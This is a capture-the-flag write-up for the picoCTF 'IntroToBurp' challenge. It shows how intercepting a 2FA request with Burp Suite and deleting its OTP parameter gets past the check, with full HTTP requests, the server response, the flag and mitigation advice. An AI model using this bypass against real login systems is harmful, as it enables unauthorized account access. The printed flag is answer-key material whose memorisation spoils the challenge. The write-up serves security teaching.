# [IntroToBurp](https://play.picoctf.org/practice/challenge/419)

## Challenge Information

- **Category**: Web Exploitation
- **Difficulty**: Easy
- **Description**: Try here to find the [flag](http://titan.picoctf.net:63062/)

## Solution Overview

This challenge introduces the use of Burp Suite to intercept and manipulate HTTP requests. The goal is to bypass a two-factor authentication (2FA) system by intercepting and modifying the authentication request.

## Hints

1. **Try using burpsuite to intercept request to capture the flag.**
2. **Try mangling the request, maybe their server-side code doesn't handle malformed requests very well.**

## Detailed Walkthrough

### Step 1: Understanding the Challenge

The website presents a registration form followed by a 2FA authentication page. The challenge hints suggest that we need to intercept and modify requests using Burp Suite to bypass security controls.

### Step 2: Setting Up Burp Suite

First, we need to configure Burp Suite:
1. Open Burp Suite
2. Configure the proxy settings (typically 127.0.0.1:8080)
3. Configure your browser to use this proxy
4. Ensure intercept is turned on in Burp Suite

### Step 3: Completing the Registration Form

Navigate to the challenge URL and fill out the registration form with any values:
- Full Name: (any name)
- Username: (any username)
- Phone Number: (any phone number)
- City: (any city)
- Password: (any password)

Submit the form to proceed to the 2FA authentication page.

### Step 4: Intercepting the 2FA Authentication Request

On the 2FA page, enter any 4-digit OTP (e.g., "0000") and submit the form. Burp Suite will intercept this request before it reaches the server.

The intercepted request looks like this:

```
POST /dashboard HTTP/1.1
Host: titan.picoctf.net:63062
Content-Length: 8
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://titan.picoctf.net:63062
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://titan.picoctf.net:63062/dashboard
Accept-Encoding: gzip, deflate, br
Cookie: session=[session-cookie-value]
Connection: keep-alive

otp=0000
```

### Step 5: Manipulating the Request

Based on the hint about "mangling the request," we need to modify the intercepted request. Looking at the request body, we see `otp=0000`. The vulnerability is that the server might not properly validate this parameter.

Send the request to Burp Suite's Repeater (right-click and select "Send to Repeater"), then:
1. Remove the `otp=0000` parameter from the request body
2. Keep the request line empty (don't remove the line itself)
3. Send the modified request

The modified request looks like this:

```
POST /dashboard HTTP/1.1
Host: titan.picoctf.net:63062
Content-Length: 8
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://titan.picoctf.net:63062
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://titan.picoctf.net:63062/dashboard
Accept-Encoding: gzip, deflate, br
Cookie: session=[session-cookie-value]
Connection: keep-alive


```

### Step 6: Retrieving the Flag

After sending the modified request, the server response contains:

```
HTTP/1.1 200 OK
Server: Werkzeug/3.0.1 Python/3.8.10
Date: Wed, 09 Apr 2025 13:14:32 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 104
Vary: Cookie
Connection: close

Welcome, asd you sucessfully bypassed the OTP request. 
Your Flag: picoCTF{#0TP_Bypvss_SuCc3$S_6bffad21}
```

The flag is revealed in the response: `picoCTF{#0TP_Bypvss_SuCc3$S_6bffad21}`

## Tools and Resources Used

- **Burp Suite**: Web vulnerability scanner and proxy tool
- **HTTP Knowledge**: Understanding of HTTP requests and responses

## Flag

```
picoCTF{#0TP_Bypvss_SuCc3$S_6bffad21}
```

## Learning Points

- **Request Interception**: Using Burp Suite to intercept HTTP requests before they reach the server.
- **Request Manipulation**: Modifying request parameters to test application security.
- **Authentication Bypass**: Understanding how improper validation of authentication parameters can lead to security vulnerabilities.
- **HTTP Protocol**: Gaining deeper understanding of HTTP request/response structure.

## Mitigation Strategies

In real-world applications, these vulnerabilities can be prevented by:

- **Server-side Validation**: Ensuring all required parameters are present and valid.
- **Input Sanitization**: Properly validating and sanitizing all user input.
- **Proper Authentication Flow**: Implementing secure authentication processes that can't be bypassed.
- **Session Management**: Implementing proper session validation to prevent unauthorized access.
- **Security Headers**: Implementing security headers to protect against common web vulnerabilities.

## References

- [Burp Suite Documentation](https://portswigger.net/burp/documentation)